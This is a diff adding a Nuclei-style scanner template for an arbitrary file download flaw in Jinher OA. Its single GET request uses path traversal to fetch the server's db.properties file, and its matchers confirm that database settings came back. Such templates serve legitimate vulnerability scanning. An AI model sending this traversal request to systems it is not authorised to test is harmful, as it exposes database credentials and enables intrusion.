@@ -1,0 +1,33 @@
+id: poc-yaml-jin-he-oaplusrangedownloadfile-anyfile-download
+info:
+  name: Jinher OA Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jc6.config="
+          - "jdbc."
+        part: body
+      - type: word
+        words:
+          - "filename=\"db.properties\""
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
